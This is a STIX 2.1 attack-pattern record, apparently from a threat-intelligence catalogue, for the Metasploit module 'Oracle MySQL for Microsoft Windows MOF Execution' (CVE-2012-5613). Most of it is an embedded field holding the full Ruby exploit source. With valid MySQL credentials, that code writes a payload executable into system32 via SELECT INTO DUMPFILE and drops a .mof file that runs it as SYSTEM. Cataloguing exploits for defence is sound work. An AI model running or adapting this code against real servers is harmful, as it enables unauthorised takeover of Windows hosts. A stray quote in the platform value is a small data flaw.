{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a52031b-0033-4f87-8c94-a65264f64f44",
    "created": "2024-08-14T16:56:40.691123Z",
    "modified": "2024-08-14T16:56:40.691128Z",
    "name": "Oracle MySQL for Microsoft Windows MOF Execution",
    "description": " This module takes advantage of a file privilege misconfiguration problem specifically against Windows MySQL servers (due to the use of a .mof file). This may result in arbitrary code execution under the context of SYSTEM. This module requires a valid MySQL account on the target machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mysql/mysql_mof.rb",
            "external_id": "mysql_mof.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Dec/13"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle MySQL for Microsoft Windows MOF Execution',\n      'Description'    => %q{\n          This module takes advantage of a file privilege misconfiguration problem\n        specifically against Windows MySQL servers (due to the use of a .mof file).\n        This may result in arbitrary code execution under the context of SYSTEM.\n        This module requires a valid MySQL account on the target machine.\n      },\n      'Author'         =>\n        [\n          'kingcope',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-5613'], #DISPUTED\n          ['OSVDB', '88118'],\n          ['EDB', '23083'],\n          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/13']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'MySQL on Windows prior to Vista', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-12-01'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The username to authenticate as']),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with'])\n      ])\n  end\n\n  def check\n    m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])\n    return Exploit::CheckCode::Safe if not m\n\n    return Exploit::CheckCode::Appears if is_windows?\n    return Exploit::CheckCode::Safe\n  end\n\n  def query(q)\n    rows = []\n\n    begin\n      res = mysql_query(q)\n      return rows if not res\n      res.each_hash do |row|\n        rows << row\n      end\n    rescue ::Mysql::ParseError\n      return rows\n    end\n\n    return rows\n  end\n\n  def is_windows?\n    r = query(\"SELECT @@version_compile_os;\")\n    return (r[0]['@@version_compile_os'] =~ /^Win/) ? true : false\n  end\n\n  def get_drive_letter\n    r = query(\"SELECT @@tmpdir;\")\n    drive = r[0]['@@tmpdir'].scan(/^(\\w):/).flatten[0] || ''\n    return drive\n  end\n\n  def upload_file(bin, dest)\n    p = bin.unpack(\"H*\")[0]\n    query(\"SELECT 0x#{p} into DUMPFILE '#{dest}'\")\n  end\n\n  def exploit\n    print_status(\"Attempting to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n    begin\n      m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])\n      return if not m\n    rescue ::Mysql::AccessDeniedError\n      print_error(\"Access denied.\")\n      return\n    end\n\n    if not is_windows?\n      print_error(\"Remote host isn't Windows.\")\n      return\n    end\n\n    drive    = get_drive_letter\n    exe_name = Rex::Text::rand_text_alpha(5) + \".exe\"\n    dest     = \"#{drive}:/windows/system32/#{exe_name}\"\n    exe      = generate_payload_exe\n    print_status(\"Uploading to '#{dest}'\")\n    begin\n      upload_file(exe, dest)\n      register_file_for_cleanup(\"#{exe_name}\")\n    rescue ::Mysql::AccessDeniedError\n      print_error(\"No permission to write. I blame kc :-)\")\n      return\n    end\n\n    mof_name = Rex::Text::rand_text_alpha(5) + \".mof\"\n    dest     = \"#{drive}:/windows/system32/wbem/mof/#{mof_name}\"\n    mof      = generate_mof(mof_name, exe_name)\n    print_status(\"Uploading to '#{dest}'\")\n    begin\n      upload_file(mof, dest)\n      register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{mof_name}\")\n    rescue ::Mysql::AccessDeniedError\n      print_error(\"No permission to write. Bail!\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-01",
    "x_mitre_platforms": [
        "win'"
    ]
}